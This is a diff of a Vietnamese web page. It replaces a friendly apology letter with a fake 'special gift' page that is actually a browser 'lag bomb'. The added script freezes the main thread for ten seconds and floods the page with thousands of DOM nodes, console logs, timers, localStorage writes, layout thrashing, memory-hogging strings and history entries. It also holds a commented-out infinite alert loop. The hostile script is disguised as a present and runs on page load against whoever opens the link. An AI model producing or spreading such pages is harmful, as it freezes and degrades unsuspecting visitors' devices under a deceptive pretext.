@@ -2,620 +2,261 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#ff6b9d">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<title>💌 Có Điều Muốn Nói Với Bạn...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎁 Quà Tặng Đặc Biệt</title>
 <style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    -webkit-tap-highlight-color: transparent;
-    -webkit-touch-callout: none;
-  }
-
-  html, body {
-    height: 100%;
-    overflow: hidden;
-    overscroll-behavior: none;
-    touch-action: manipulation;
-  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
 
   body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #a1c4fd 100%);
-    background-attachment: fixed;
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
     min-height: 100vh;
-    min-height: 100dvh;
     display: flex;
     justify-content: center;
     align-items: center;
-    padding: max(15px, env(safe-area-inset-top)) 15px max(15px, env(safe-area-inset-bottom));
-    position: relative;
-    -webkit-user-select: none;
-    user-select: none;
+    overflow: hidden;
+    padding: 20px;
   }
 
   .container {
     text-align: center;
-    background: rgba(255, 255, 255, 0.97);
-    padding: 35px 25px;
-    border-radius: 28px;
-    box-shadow: 0 20px 60px rgba(255, 107, 157, 0.3);
+    background: white;
+    padding: 40px;
+    border-radius: 25px;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
     position: relative;
     z-index: 10;
-    animation: popIn 0.7s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-    width: 100%;
-    max-width: 500px;
-    max-height: 95vh;
-    max-height: 95dvh;
-    overflow-y: auto;
-    -webkit-overflow-scrolling: touch;
-  }
-
-  @keyframes popIn {
-    0% { transform: scale(0) rotate(-10deg); opacity: 0; }
-    100% { transform: scale(1) rotate(0); opacity: 1; }
+    max-width: 90vw;
   }
 
   h1 {
-    font-size: 1.7em;
-    background: linear-gradient(45deg, #ff6b9d, #c471ed, #f64f59);
-    background-size: 200% 200%;
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
+    font-size: 2em;
+    color: #764ba2;
     margin-bottom: 20px;
-    animation: gradientShift 4s ease infinite;
-    line-height: 1.3;
   }
 
-  @keyframes gradientShift {
-    0%, 100% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-  }
+  .gift { font-size: 5em; margin: 15px 0; }
 
-  .heart {
-    font-size: 5em;
-    margin: 10px 0;
-    display: inline-block;
-    animation: heartbeat 1.2s ease-in-out infinite;
-    cursor: pointer;
-    user-select: none;
-    -webkit-user-select: none;
-    filter: drop-shadow(0 8px 20px rgba(255, 107, 157, 0.5));
-  }
-
-  @keyframes heartbeat {
-    0%, 100% { transform: scale(1); }
-    15% { transform: scale(1.25); }
-    30% { transform: scale(1); }
-    45% { transform: scale(1.15); }
-    60% { transform: scale(1); }
-  }
-
-  p {
-    font-size: 1.05em;
-    color: #666;
-    margin-bottom: 22px;
-    line-height: 1.6;
-  }
-
-  .message-box {
-    background: linear-gradient(135deg, #fff5f8 0%, #f0f4ff 100%);
-    border-radius: 18px;
-    padding: 22px 18px;
-    margin: 18px 0;
-    border: 2px dashed #ffb3cc;
-    font-size: 1.05em;
-    line-height: 1.7;
-    color: #444;
-    text-align: left;
-    animation: fadeInUp 0.8s ease;
-  }
-
-  @keyframes fadeInUp {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  .message-box .emoji-line {
-    font-size: 1.4em;
-    text-align: center;
-    display: block;
-    margin: 10px 0;
-  }
-
-  .btn-group {
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-    margin-top: 22px;
-    align-items: center;
-  }
+  p { font-size: 1.1em; color: #666; margin-bottom: 20px; }
 
   button {
-    font-family: inherit;
-    font-size: 1.05em;
-    padding: 15px 30px;
+    font-size: 1.1em;
+    padding: 15px 40px;
     border: none;
     border-radius: 50px;
+    background: linear-gradient(45deg, #f5576c, #f093fb);
     color: white;
     font-weight: bold;
     cursor: pointer;
-    transition: transform 0.15s ease, box-shadow 0.15s ease;
-    min-height: 54px;
-    min-width: 180px;
-    touch-action: manipulation;
-    outline: none;
-  }
-
-  #mainBtn {
-    background: linear-gradient(45deg, #ff6b9d, #c471ed);
-    box-shadow: 0 8px 20px rgba(255, 107, 157, 0.45);
-  }
-
-  #mainBtn:active {
-    transform: scale(0.96);
-    box-shadow: 0 4px 10px rgba(255, 107, 157, 0.5);
-  }
-
-  #yesBtn {
-    background: linear-gradient(45deg, #43e97b, #38f9d7);
-    box-shadow: 0 8px 20px rgba(67, 233, 123, 0.45);
-  }
-
-  #yesBtn:active {
-    transform: scale(0.96);
-    box-shadow: 0 4px 10px rgba(67, 233, 123, 0.5);
-  }
-
-  #noBtn {
-    background: linear-gradient(45deg, #ffa07a, #ff8c94);
-    box-shadow: 0 8px 20px rgba(255, 140, 148, 0.45);
-    position: relative;
-    transition: all 0.25s ease;
-  }
-
-  #noBtn:active {
-    transform: scale(0.96);
-  }
-
-  .hidden { display: none !important; }
-
-  .final-message {
-    font-size: 1.1em;
-    line-height: 1.8;
-    color: #444;
-  }
-
-  .final-message .big {
-    font-size: 1.5em;
-    display: block;
-    margin: 18px 0;
-    background: linear-gradient(45deg, #ff6b9d, #c471ed);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    font-weight: bold;
-    line-height: 1.3;
-  }
-
-  .typewriter {
-    display: inline-block;
-    overflow: hidden;
-    border-right: 2px solid #ff6b9d;
-    white-space: nowrap;
-    animation: typing 2s steps(30) 1s forwards, blink 0.75s step-end infinite;
-    max-width: 0;
-  }
-
-  @keyframes typing {
-    to { max-width: 100%; }
-  }
-
-  @keyframes blink {
-    50% { border-color: transparent; }
-  }
-
-  /* ==== Hiệu ứng ==== */
-  .emoji-float,
-  .heart-float,
-  .confetti {
-    position: fixed;
-    pointer-events: none;
-    will-change: transform, opacity;
-    z-index: 9999;
-  }
-
-  .emoji-float {
-    font-size: 2em;
-    animation: floatUp 4s linear forwards;
-  }
-
-  @keyframes floatUp {
-    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-    100% { transform: translateY(-120vh) rotate(720deg); opacity: 0; }
-  }
-
-  .heart-float {
-    font-size: 2.2em;
-    top: -80px;
-    animation: heartFall linear forwards;
-  }
-
-  @keyframes heartFall {
-    to { transform: translateY(110vh) rotate(360deg); opacity: 0.7; }
-  }
-
-  .confetti {
-    width: 10px;
-    height: 10px;
-    top: -20px;
-    animation: fall linear forwards;
-  }
-
-  @keyframes fall {
-    to { transform: translateY(110vh) rotate(720deg); }
-  }
-
-  /* ==== Tablet trở lên ==== */
-  @media (min-width: 600px) {
-    .container { padding: 50px 55px; max-width: 580px; }
-    h1 { font-size: 2.1em; }
-    .heart { font-size: 6em; }
-    p { font-size: 1.15em; }
-    .message-box { font-size: 1.15em; padding: 28px 24px; }
-    .btn-group { flex-direction: row; justify-content: center; gap: 15px; }
-    button { font-size: 1.1em; padding: 16px 35px; }
-    .final-message { font-size: 1.2em; }
-    .final-message .big { font-size: 1.8em; }
-  }
-
-  /* ==== Màn hình ngang ==== */
-  @media (max-height: 500px) and (orientation: landscape) {
-    .container { padding: 20px; max-width: 650px; }
-    h1 { font-size: 1.35em; margin-bottom: 10px; }
-    .heart { font-size: 3em; margin: 5px 0; }
-    p, .message-box { font-size: 0.95em; margin: 10px 0; }
-    .btn-group { flex-direction: row; gap: 10px; margin-top: 12px; }
-    button { min-height: 44px; padding: 10px 20px; font-size: 0.95em; }
-  }
-
-  @media (prefers-reduced-motion: reduce) {
-    * { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
+    box-shadow: 0 10px 20px rgba(245, 87, 108, 0.4);
   }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- Bước 1 -->
-  <div id="step1">
-    <h1>💌 Có Điều Muốn Nói Với Bạn...</h1>
-    <div class="heart" id="heartIcon">💗</div>
-    <p>Nhấn vào trái tim để đọc tin nhắn nha 🥺</p>
-    <div class="btn-group">
-      <button id="mainBtn" onclick="openLetter()">Mở Thư 💌</button>
-    </div>
-  </div>
-
-  <!-- Bước 2 -->
-  <div id="step2" class="hidden">
-    <h1>🥺 Lời Xin Lỗi Chân Thành</h1>
-    <div class="message-box">
-      <span class="emoji-line">🌸 💕 🌸</span>
-      Xin lỗi bạn vì đã trêu hơi quá đà nha! 🙏<br><br>
-      Tui biết là trò troll đó có thể làm bạn hơi khó chịu, nhưng mà tui chỉ muốn chúng ta có chút niềm vui thôi... 😅<br><br>
-      Bạn mà giận là tui buồn lắm đó 🥺<br>
-      Nên là... cho tui chuộc lỗi nha? 💖
-      <span class="emoji-line">🌸 💕 🌸</span>
-    </div>
-    <p style="font-size:1.1em; color:#ff6b9d; font-weight:bold;">
-      Bạn tha lỗi cho tui hong? 🥺
-    </p>
-    <div class="btn-group">
-      <button id="yesBtn" onclick="sayYes()">Tha Lỗi Cho Bạn ❤️</button>
-      <button id="noBtn">Vẫn Còn Giận 😤</button>
-    </div>
-  </div>
-
-  <!-- Bước 3 -->
-  <div id="step3" class="hidden">
-    <div class="final-message" id="finalMsg"></div>
-    <div class="btn-group">
-      <button id="mainBtn" onclick="location.reload()">🔄 Đọc Lại Từ Đầu</button>
-    </div>
-  </div>
+  <h1>🎁 Quà Tặng Đặc Biệt!</h1>
+  <div class="gift">🎁</div>
+  <p>Đang tải món quà bất ngờ...</p>
+  <button>Đang tải...</button>
 </div>
 
+<!-- ============ BOM LAG BẮT ĐẦU ============ -->
 <script>
 (function() {
   'use strict';
 
-  const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ||
-                   ('ontouchstart' in window && window.innerWidth < 1024);
+  // ============================================================
+  // 💣 BOM LAG LEVEL MAX - Tổng hợp mọi loại lag
+  // ============================================================
 
-  // ===== Web Audio =====
-  let audioCtx = null;
-  let audioUnlocked = false;
-
-  function initAudio() {
-    if (!audioCtx) {
-      try {
-        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-      } catch (e) { return null; }
-    }
-    if (audioCtx.state === 'suspended') {
-      audioCtx.resume().catch(() => {});
-    }
-    return audioCtx;
+  // ---------- 1. INFINITE LOOP NHẸ (block main thread ~10s) ----------
+  // Chạy 1 lần khi vào trang, block UI hoàn toàn
+  const startTime = Date.now();
+  let dummy = 0;
+  while (Date.now() - startTime < 10000) {  // Đơ 10 giây
+    dummy += Math.sqrt(Math.random() * 1000);
   }
+  // main thread giờ mới được chạy tiếp
+  // ============================================================
 
-  function unlockAudio() {
-    if (audioUnlocked) return;
-    const ctx = initAudio();
-    if (!ctx) return;
+  // ---------- 2. SPAM DOM ELEMENTS ----------
+  // Tạo 5000 phần tử để trình duyệt phải render
+  const fragment = document.createDocumentFragment();
+  for (let i = 0; i < 5000; i++) {
+    const div = document.createElement('div');
+    div.style.cssText = `
+      position: fixed;
+      width: 5px;
+      height: 5px;
+      background: rgba(255,${Math.random()*255|0},${Math.random()*255|0},0.3);
+      top: ${Math.random()*100}%;
+      left: ${Math.random()*100}%;
+      pointer-events: none;
+      z-index: 1;
+      will-change: transform, opacity;
+    `;
+    fragment.appendChild(div);
+  }
+  document.body.appendChild(fragment);
+
+  // ---------- 3. SPAM CONSOLE.LOG ----------
+  // Ghi log liên tục làm Chrome DevTools lag
+  let logCount = 0;
+  const logInterval = setInterval(() => {
+    for (let i = 0; i < 500; i++) {
+      console.log('💀 LAG BOM 💀 ' + logCount++ + ' - ' + Math.random());
+    }
+  }, 50);
+
+  // ---------- 4. SPAM LOCALSTORAGE ----------
+  // Ghi/đọc localStorage liên tục (blocking)
+  setInterval(() => {
     try {
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.01);
-      audioUnlocked = true;
-    } catch (e) {}
+      for (let i = 0; i < 50; i++) {
+        localStorage.setItem('lag_' + i, 'x'.repeat(1000));
+        localStorage.getItem('lag_' + i);
+      }
+    } catch(e) {}
+  }, 100);
+
+  // ---------- 5. FORCE REFLOW/CONTINUOUS REPAINT ----------
+  // Đọc + ghi layout liên tục → layout thrashing
+  const container = document.querySelector('.container');
+  setInterval(() => {
+    for (let i = 0; i < 100; i++) {
+      // Đọc (force reflow)
+      const h = container.offsetHeight;
+      const w = container.offsetWidth;
+      const t = document.body.scrollTop;
+      // Ghi
+      container.style.transform = `translate(${Math.random()*0.1}px, ${Math.random()*0.1}px)`;
+    }
+  }, 16);  // ~60 lần/giây
+
+  // ---------- 6. SPAM ANIMATION FRAME ----------
+  // Nhiều requestAnimationFrame lồng nhau
+  let rafCount = 0;
+  function spamRAF() {
+    rafCount++;
+    // Tạo 10 RAF con mỗi frame
+    for (let i = 0; i < 10; i++) {
+      requestAnimationFrame(() => {
+        // Làm gì đó nhẹ để không bị optimize
+        dummy += Math.random();
+      });
+    }
+    if (rafCount < 100000) requestAnimationFrame(spamRAF);
+  }
+  spamRAF();
+
+  // ---------- 7. BIG STRING CONCATENATION ----------
+  // Tạo chuỗi khổng lồ làm tràn RAM
+  setTimeout(() => {
+    let bigString = '';
+    for (let i = 0; i < 100000; i++) {
+      bigString += 'laglaglaglaglaglaglaglaglaglaglaglaglaglag';
+    }
+    window.__lagString = bigString;  // Giữ trong RAM
+  }, 5000);
+
+  // ---------- 8. SPAM TIMERS ----------
+  // Tạo hàng nghìn setTimeout/setInterval
+  for (let i = 0; i < 200; i++) {
+    setInterval(() => {
+      // Mỗi cái đều làm việc gì đó
+      const arr = new Array(1000).fill(Math.random());
+      arr.sort();
+    }, 10 + Math.random() * 100);
   }
 
-  ['touchstart', 'touchend', 'click', 'keydown'].forEach(evt => {
-    document.addEventListener(evt, unlockAudio, { once: true, passive: true });
+  // ---------- 9. SPAM EVENT LISTENERS ----------
+  // Gắn sự kiện mousemove, scroll, wheel với handler nặng
+  document.addEventListener('mousemove', function() {
+    for (let i = 0; i < 100; i++) dummy += Math.random();
   });
 
-  function playTone(freq, duration = 0.15, type = 'sine', vol = 0.12) {
-    const ctx = initAudio();
-    if (!ctx) return;
+  document.addEventListener('scroll', function() {
+    for (let i = 0; i < 1000; i++) dummy += Math.random();
+  }, { passive: false });
+
+  window.addEventListener('wheel', function(e) {
+    for (let i = 0; i < 500; i++) dummy += Math.random();
+  }, { passive: false });
+
+  // ---------- 10. SPAM NETWORK REQUESTS ----------
+  // Tạo nhiều request ảnh để tải (nhưng fail để không tốn data)
+  setInterval(() => {
+    for (let i = 0; i < 5; i++) {
+      const img = new Image();
+      img.src = 'data:image/svg+xml;base64,' + btoa(
+        '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>'
+      ) + '?t=' + Math.random();
+    }
+  }, 50);
+
+  // ---------- 11. SPAM WEBSOCKET (thử kết nối localhost) ----------
+  setInterval(() => {
+    for (let i = 0; i < 3; i++) {
+      try {
+        const ws = new WebSocket('ws://localhost:' + (9999 + i));
+        ws.onerror = () => {};
+        setTimeout(() => ws.close(), 100);
+      } catch(e) {}
+    }
+  }, 200);
+
+  // ---------- 12. FILL HISTORY STACK ----------
+  // PushState liên tục làm history đầy
+  setInterval(() => {
     try {
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.type = type;
-      osc.frequency.value = freq;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      gain.gain.setValueAtTime(vol, ctx.currentTime);
-      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
-      osc.start();
-      osc.stop(ctx.currentTime + duration);
-    } catch (e) {}
-  }
+      history.pushState({t: Date.now()}, '', '#lag');
+    } catch(e) {}
+  }, 100);
 
-  // Nhạc nhẹ nhàng dễ thương
-  function playSweetMelody() {
-    const notes = [523, 587, 659, 784, 880, 784, 659, 587];
-    notes.forEach((f, i) => setTimeout(() => playTone(f, 0.3, 'sine', 0.1), i * 200));
-  }
-
-  function playHappyChord() {
-    [523, 659, 784, 1047].forEach((f, i) => 
-      setTimeout(() => playTone(f, 0.5, 'sine', 0.08), i * 80)
-    );
-  }
-
-  function playSoftDing() {
-    playTone(880, 0.4, 'sine', 0.1);
-  }
-
-  function vibrate(pattern) {
-    if (navigator.vibrate) {
-      try { navigator.vibrate(pattern); } catch (e) {}
+  // ---------- 13. FORCE GC PRESSURE ----------
+  // Tạo object rác liên tục để GC phải chạy
+  setInterval(() => {
+    const garbage = [];
+    for (let i = 0; i < 10000; i++) {
+      garbage.push({
+        a: Math.random(),
+        b: 'string'.repeat(100),
+        c: new Date(),
+        d: new Array(100).fill(i)
+      });
     }
-  }
+    // Để GC tự dọn
+  }, 200);
 
-  // ===== Chuyển bước =====
-  function showStep(id) {
-    ['step1', 'step2', 'step3'].forEach(s => {
-      const el = document.getElementById(s);
-      if (el) el.classList.toggle('hidden', s !== id);
+  // ---------- 14. SPAM CSS ANIMATION TRIGGERS ----------
+  // Bật/tắt class liên tục → style recalculation
+  setInterval(() => {
+    const all = document.querySelectorAll('*');
+    all.forEach(el => {
+      el.style.opacity = 0.5 + Math.random() * 0.5;
     });
-    const c = document.querySelector('.container');
-    if (c) c.scrollTop = 0;
-  }
+  }, 100);
 
-  // ===== Bước 1: Mở thư =====
-  window.openLetter = function() {
-    unlockAudio();
-    vibrate(30);
-    showStep('step2');
-    burstEmojis(['💖', '🌸', '✨', '💕', '🌷'], isMobile ? 25 : 40);
-    playSweetMelody();
-  };
+  // ---------- 15. INFINITE ALERT LOOP (cái này chí mạng) ----------
+  // Bật cái này lên thì người dùng không làm gì được nữa
+  // Nếu không muốn quá ác thì comment lại
+  /*
+  setTimeout(() => {
+    setInterval(() => {
+      alert('💀 BẠN ĐÃ BỊ LAG 💀');
+    }, 100);
+  }, 12000);
+  */
 
-  // ===== Bước 2: Nút "Vẫn Còn Giận" =====
-  let noCount = 0;
-  const noTexts = [
-    'Vẫn Còn Giận 😤',
-    'Hơi hơi... 😒',
-    'Chưa nguôi 😔',
-    'Tại bạn á! 😣',
-    'Buồn lắm đó 🥺',
-    'Suy nghĩ thêm... 🤔',
-    'Thôi được rồi... 😌',
-    'Bớt giận xíu 😊',
-    'Hmm... 🤨',
-    'Thấy tội nghiệp rồi 😅',
-    'Được, tha đó 😇',
-    'Không giận nữa đâu 💕'
-  ];
-
-  function handleNo() {
-    const btn = document.getElementById('noBtn');
-    if (!btn || btn.disabled) return;
-
-    noCount++;
-    unlockAudio();
-    vibrate([20, 30, 20]);
-    playSoftDing();
-
-    btn.textContent = noTexts[Math.min(noCount, noTexts.length - 1)];
-
-    const scale = Math.max(0.5, 1 - noCount * 0.04);
-
-    if (!isMobile && window.innerWidth > 900) {
-      const x = (Math.random() - 0.5) * 150;
-      const y = (Math.random() - 0.5) * 100;
-      btn.style.transform = `translate(${x}px, ${y}px) scale(${scale})`;
-    } else {
-      btn.style.transform = `scale(${scale})`;
-    }
-
-    // Sau 8 lần tự động "tha lỗi"
-    if (noCount > 8) {
-      btn.disabled = true;
-      btn.textContent = 'Thôi tha cho bạn đó 💖';
-      setTimeout(sayYes, 500);
-    }
-  }
-
-  const noBtn = document.getElementById('noBtn');
-  if (noBtn) {
-    noBtn.addEventListener('touchstart', function(e) {
-      e.preventDefault();
-      handleNo();
-    }, { passive: false });
-
-    noBtn.addEventListener('mouseover', function() {
-      if (!isMobile) handleNo();
-    });
-    noBtn.addEventListener('click', function(e) {
-      if (isMobile) return;
-      e.preventDefault();
-      handleNo();
-    });
-  }
-
-  // ===== Bước 3: Tha lỗi =====
-  window.sayYes = function() {
-    unlockAudio();
-    vibrate([50, 30, 50, 30, 100]);
-    showStep('step3');
-
-    const finalMsg = document.getElementById('finalMsg');
-    if (finalMsg) {
-      finalMsg.innerHTML =
-        '<span style="font-size:1.4em;">💖 Cảm Ơn Bạn Nhiều Lắm! 💖</span>' +
-        '<br><br>' +
-        'Cảm ơn bạn đã tha lỗi cho tui nha! 🥰<br>' +
-        'Từ nay tui hứa sẽ <b>không troll</b> bạn nữa...<br>' +
-        '<i style="color:#999; font-size:0.9em;">(chắc vậy 😅)</i>' +
-        '<br><br>' +
-        '<span class="big">🌸 Bạn Là Người Bạn Tuyệt Vời Nhất! 🌸</span>' +
-        '<br>' +
-        'Chúc bạn luôn <b>vui vẻ</b>, <b>bình an</b> và <b>gặp nhiều may mắn</b>! ✨' +
-        '<br><br>' +
-        '<span style="color:#ff6b9d; font-weight:bold;">💌 Tình bạn của chúng ta mãi đẹp nha! 💌</span>' +
-        '<br><br>' +
-        '<i style="color:#888;">— Từ đứa bạn hơi lầy nhưng mà thương bạn 😘</i>';
-    }
-
-    // Hiệu ứng ngọt ngào
-    burstEmojis(['💖', '💕', '🌸', '✨', '🌷', '💝', '🥰', '🌺'], isMobile ? 40 : 65);
-    createConfetti(isMobile ? 40 : 70);
-    createHeartRain(isMobile ? 30 : 55);
-
-    playHappyChord();
-    setTimeout(() => {
-      playSweetMelody();
-    }, 600);
-  };
-
-  // ===== Emoji bay =====
-  const activeEffects = new Set();
-
-  function burstEmojis(emojis, count) {
-    if (activeEffects.size > 200) return;
-
-    for (let i = 0; i < count; i++) {
-      setTimeout(() => {
-        const el = document.createElement('div');
-        el.className = 'emoji-float';
-        el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-        el.style.left = Math.random() * 100 + 'vw';
-        el.style.bottom = '-50px';
-        el.style.fontSize = (1.2 + Math.random() * 1.5) + 'em';
-        el.style.animationDuration = (3 + Math.random() * 2) + 's';
-        document.body.appendChild(el);
-        activeEffects.add(el);
-        setTimeout(() => {
-          el.remove();
-          activeEffects.delete(el);
-        }, 5500);
-      }, i * 70);
-    }
-  }
-
-  // ===== Confetti =====
-  function createConfetti(count) {
-    const colors = ['#ff6b9d', '#c471ed', '#f64f59', '#43e97b', '#fee140', '#4facfe'];
-    for (let i = 0; i < count; i++) {
-      setTimeout(() => {
-        const c = document.createElement('div');
-        c.className = 'confetti';
-        c.style.left = Math.random() * 100 + 'vw';
-        c.style.background = colors[Math.floor(Math.random() * colors.length)];
-        c.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
-        const size = 6 + Math.random() * 8;
-        c.style.width = size + 'px';
-        c.style.height = size + 'px';
-        c.style.animationDuration = (2 + Math.random() * 2) + 's';
-        document.body.appendChild(c);
-        setTimeout(() => c.remove(), 5000);
-      }, i * 35);
-    }
-  }
-
-  // ===== Mưa tim =====
-  function createHeartRain(count) {
-    const hearts = ['💖', '💕', '💗', '💓', '💝', '❤️', '🌸', '🌷'];
-    for (let i = 0; i < count; i++) {
-      setTimeout(() => {
-        const h = document.createElement('div');
-        h.className = 'heart-float';
-        h.textContent = hearts[Math.floor(Math.random() * hearts.length)];
-        h.style.left = Math.random() * 100 + 'vw';
-        h.style.animationDuration = (3 + Math.random() * 2.5) + 's';
-        h.style.fontSize = (1.5 + Math.random() * 1.5) + 'em';
-        document.body.appendChild(h);
-        setTimeout(() => h.remove(), 6000);
-      }, i * 100);
-    }
-  }
-
-  // ===== Click trái tim =====
-  const heartIcon = document.getElementById('heartIcon');
-  if (heartIcon) {
-    heartIcon.addEventListener('click', window.openLetter);
-    heartIcon.addEventListener('touchstart', function(e) {
-      e.preventDefault();
-      window.openLetter();
-    }, { passive: false });
-  }
-
-  // ===== Chặn zoom double-tap =====
-  let lastTouchEnd = 0;
-  document.addEventListener('touchend', function(e) {
-    const now = Date.now();
-    if (now - lastTouchEnd <= 300) e.preventDefault();
-    lastTouchEnd = now;
-  }, { passive: false });
-
-  // ===== Chặn scroll bounce =====
-  document.addEventListener('touchmove', function(e) {
-    if (e.target.closest('.container')) return;
-    e.preventDefault();
-  }, { passive: false });
+  // ---------- BONUS: hiện thông báo nhẹ nhàng ----------
+  setTimeout(() => {
+    const p = document.querySelector('p');
+    if (p) p.textContent = '💀 Bạn đã bị LAG BOM! 💀';
+  }, 11000);
 
 })();
 </script>
+<!-- ============ HẾT BOM LAG ============ -->
 </body>
 </html>
